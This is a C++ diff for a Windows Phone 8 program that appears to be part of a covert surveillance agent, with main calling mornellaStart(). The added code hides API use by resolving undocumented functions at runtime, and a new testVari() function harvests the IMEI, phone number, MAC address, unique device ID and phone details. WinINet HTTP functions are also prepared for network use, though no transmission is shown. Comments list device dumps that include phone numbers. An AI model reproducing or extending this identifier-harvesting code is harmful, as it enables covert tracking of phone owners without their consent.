@@ -1,5 +1,6 @@
 ﻿extern "C" int mornellaStart(void);
 
+
 //#include "pch.h"
 #include <windows.h>
 #include "FunctionFunc.h"
@@ -38,8 +39,24 @@
 	FunctionFuncGetSystemInfo _GetSystemInfo;
 	FunctionFuncSetFilePointer _SetFilePointer;
 	FunctionFuncCreateProcessW _CreateProcessW;
-
-
+	FunctionFuncGetDeviceUniqueID _GetDeviceUniqueID;
+	FunctionFuncGetIMEI _GetIMEI;
+	FunctionFuncDevicePropertiesGetProcessMemoryInfo _DevicePropertiesGetProcessMemoryInfo;
+	FunctionFuncDevicePropertiesGetUniqueDeviceId _DevicePropertiesGetUniqueDeviceId;
+	FunctionFuncBNSCGetBackgroundServiceId _BNSCGetBackgroundServiceId;
+	FunctionFuncDevicePropertiesGlobalMemoryStatus _DevicePropertiesGlobalMemoryStatus;
+	FunctionFuncQueryPhoneInformation _QueryPhoneInformation;
+	FunctionFuncGetPhoneNumber _GetPhoneNumber;
+	FunctionFuncGetMACAddress _GetMACAddress;
+	FunctionFuncTerminateThread _TerminateThread;
+	FunctionFuncGetTickCount _GetTickCount;
+	FunctionFuncInternetOpenW _InternetOpenW;
+	FunctionFuncInternetConnectW _InternetConnectW;
+	FunctionFuncInternetCloseHandle _InternetCloseHandle;
+	FunctionFuncHttpOpenRequestW _HttpOpenRequestW;
+	FunctionFuncHttpSendRequestW _HttpSendRequestW;
+	FunctionFuncHttpQueryInfoW _HttpQueryInfoW;
+	FunctionFuncInternetReadFile _InternetReadFile;
 
 PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
 {
@@ -178,10 +195,14 @@ int setLoadLibraryExW(void)
 	_Sleep = (FunctionFuncSleep)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"Sleep");
 	_GetModuleHandleW=  (FunctionFuncGetModuleHandleW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetModuleHandleW");
 	_CreateThread=  (FunctionFuncCreateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateThread");
+	_TerminateThread=  (FunctionFuncTerminateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"TerminateThread");
 	_WaitForSingleObject=  (FunctionFuncWaitForSingleObject)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"WaitForSingleObject");
 	_CreateEventW = (FunctionFuncCreateEvent)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateEventW");
 	 
 	HINSTANCE LibHandle;
+	
+	
+
 	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
 	_CreateToolhelp32Snapshot =  (FunctionFuncCreateToolhelp32Snapshot)GetProcAddress(LibHandle,"CreateToolhelp32Snapshot");
 
@@ -289,15 +310,251 @@ int setLoadLibraryExW(void)
     _CreateProcessW=  (FunctionFuncCreateProcessW)GetProcAddress(LibHandle,"CreateProcessW");
 	
 
+	LibHandle = LoadLibraryExW(L"WPCOREUTIL",NULL,0);
+    _GetDeviceUniqueID=  (FunctionFuncGetDeviceUniqueID)GetProcAddress(LibHandle,"GetDeviceUniqueID");
+
+
+	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
+    _GetIMEI=  (FunctionFuncGetIMEI)GetProcAddress(LibHandle,"GetIMEI");
+
+	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
+    _GetPhoneNumber=  (FunctionFuncGetPhoneNumber)GetProcAddress(LibHandle,"GetPhoneNumber");
+
+
+	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
+    _DevicePropertiesGetProcessMemoryInfo=  (FunctionFuncDevicePropertiesGetProcessMemoryInfo)GetProcAddress(LibHandle,"DevicePropertiesGetProcessMemoryInfo");
+
+
+
+	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
+    _DevicePropertiesGetUniqueDeviceId=  (FunctionFuncDevicePropertiesGetUniqueDeviceId)GetProcAddress(LibHandle,"DevicePropertiesGetUniqueDeviceId");
+
+	//BNSCGetBackgroundServiceId(int a1)
+;
+
+	LibHandle = LoadLibraryExW(L"BNSClient",NULL,0);
+    _BNSCGetBackgroundServiceId=  (FunctionFuncBNSCGetBackgroundServiceId)GetProcAddress(LibHandle,"BNSCGetBackgroundServiceId");
+
+
+
+	
+	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
+    _DevicePropertiesGlobalMemoryStatus=  (FunctionFuncDevicePropertiesGlobalMemoryStatus)GetProcAddress(LibHandle,"DevicePropertiesGlobalMemoryStatus");
+
+
+	
+
+	//QueryPhoneInformation
+	//public static extern bool QueryPhoneInformation(int key, StringBuilder value, int inSize);
+
+	LibHandle = LoadLibraryExW(L"PHONEINFO",NULL,0);
+    _QueryPhoneInformation=  (FunctionFuncQueryPhoneInformation)GetProcAddress(LibHandle,"QueryPhoneInformation");
+
+
+	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
+    _GetMACAddress=  (FunctionFuncGetMACAddress)GetProcAddress(LibHandle,"GetMACAddress");
+
+
+	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
+    _GetTickCount=  (FunctionFuncGetTickCount)GetProcAddress(LibHandle,"GetTickCount");
+
+
+
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _InternetOpenW=  (FunctionFuncInternetOpenW)GetProcAddress(LibHandle,"InternetOpenW");
+
+
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _InternetConnectW=  (FunctionFuncInternetConnectW)GetProcAddress(LibHandle,"InternetConnectW");
+
+
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _InternetCloseHandle=  (FunctionFuncInternetCloseHandle)GetProcAddress(LibHandle,"InternetCloseHandle");
+
+
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _HttpOpenRequestW=  (FunctionFuncHttpOpenRequestW)GetProcAddress(LibHandle,"HttpOpenRequestW");
+
+		
+
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _HttpSendRequestW=  (FunctionFuncHttpSendRequestW)GetProcAddress(LibHandle,"HttpSendRequestW");
+
+
+	
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _HttpQueryInfoW=  (FunctionFuncHttpQueryInfoW)GetProcAddress(LibHandle,"HttpQueryInfoW");
+
+
+	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
+    _InternetReadFile=  (FunctionFuncInternetReadFile)GetProcAddress(LibHandle,"InternetReadFile");
+
+
 	return 0;
 }
 
+void testVari(void)
+{
+
+		BYTE array[20];
+	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));
+
+	WCHAR Phonenum[64];
+
+	_GetPhoneNumber(Phonenum);
+
+	BYTE MAC[128];
+	_GetMACAddress(MAC);
+
+	/*
+	byte[] array = new byte[20];
+				DeviceInfoNativeMethods.GetUniqueDeviceId(array, (uint)array.Length);
+				propertyValue = array;
+				*/
+
+
+
+	 WCHAR stringBuilder[256];
+	
+	 /*
+	 public enum PhoneKeys
+{
+	DeviceManufacturer,
+	DeviceName = 5,
+	DeviceHardwareVersion,
+	DeviceFirmwareVersion = 8
+}
+	 */
+/***
+	 //DeviceManufacturer	
+	_QueryPhoneInformation(0,stringBuilder,sizeof(stringBuilder),NULL);
+
+	//DeviceName
+	_QueryPhoneInformation(5,stringBuilder,sizeof(stringBuilder),NULL);
+
+	//DeviceHardwareVersion
+	_QueryPhoneInformation(6,stringBuilder,sizeof(stringBuilder),NULL);
+
+	//DeviceFirmwareVersion
+	_QueryPhoneInformation(8,stringBuilder,sizeof(stringBuilder),NULL);
+	***/
+	
+	
+	DWORD ret;
+	WCHAR msg[1024];
+	
+
+	for(DWORD ix=0;ix<0xf;ix++)
+	{
+		bool rrr=_QueryPhoneInformation(ix,stringBuilder,sizeof(stringBuilder)/sizeof(WCHAR),&ret);
+		swprintf_s(msg, TEXT("%i) %s\n"),ix,stringBuilder);OutputDebugString(msg);
+	}
+	
+	/*
+	0) NOKIA
+1) 
+2) 000-IT
+3) CV ID 232.O2
+4) Lumia 820
+5) RM-825_eu_italy_232
+6) 1.0.0.0
+7) 8960
+8) 1232.2109.1242.1002
+9) 
+10) 1.0.202041.3
+11) 
+12) 
+13) 
+14) http://link.nokia.com/support
+15) Windows Phone 8 ByGio
+	*/
+/*
+0) NOKIA
+1) 
+2) 000-GB
+3) CV GB SW Variant ID 276 v03
+4) Lumia 920
+5) RM-821_eu_euro1_276
+6) 1.0.0.0
+7) 8960
+8) 1232.2110.1244.3003
+9) 
+10) 1.0.202041.3
+11) 
+12) +448450455555
+13) 
+14) http://link.nokia.com/support
+15) WP920
+*/
+
+	/*
+	0) HTC
+1) 0
+2) 000-33
+3) 
+4) Windows Phone 8S by HTC
+5) Windows Phone 8S by HTC
+6) 0001
+7) 8227
+8) 1030.54.10403.401
+9) 1.102.0.D4
+10) 1.11b.3054.25_10.13.30.54P
+11) 0.0.1030.54(159870)
+12) +33-170-759-171
+13) 
+14) 
+15) Windows Phone
+	*/
+
+
+	//
+
+	//Microsoft.Phone.Info.DeviceExtendedProperties.GetValue("DeviceUniqueId");
+
+	 PROCESS_MEMORY_COUNTERS memCounter;
+	_DevicePropertiesGetProcessMemoryInfo( &memCounter,sizeof( memCounter ));
+
+	/*
+	if ("DeviceTotalMemory" == propertyName)
+						{
+							uint num = 0u;
+							bool flag2 = Registry.QueryDwordValue(2147483650u, "Software\\Microsoft\\AppPlatform", "OverrideDeviceMemoryAPI", ref num);
+							propertyValue = (long)((ulong)num);
+							if (!flag2)
+							{
+								DeviceInfoNativeMethods.MEMORYSTATUS mEMORYSTATUS = default(DeviceInfoNativeMethods.MEMORYSTATUS);
+								mEMORYSTATUS.dwLength = (uint)Marshal.SizeOf(mEMORYSTATUS);
+								DeviceInfoNativeMethods.GlobalMemoryStatus(ref mEMORYSTATUS);
+								propertyValue = (long)mEMORYSTATUS.ullTotalPhys;
+							}
+	*/
+
+	MEMORYSTATUS memStatus;
+	memStatus.dwLength = sizeof(memStatus);
+	_DevicePropertiesGlobalMemoryStatus(&memStatus);
+
+
+
+
+
+
+
+		BYTE *pImei2;
+		BYTE alloco[64];
+		pImei2=alloco;
+		_GetIMEI(pImei2);
+
+}
 
 [Platform::MTAThread]
 int main(Platform::Array<Platform::String^>^)
 {
 
 	setLoadLibraryExW();
+	
+	testVari();
+
+	
 
 	mornellaStart();
 
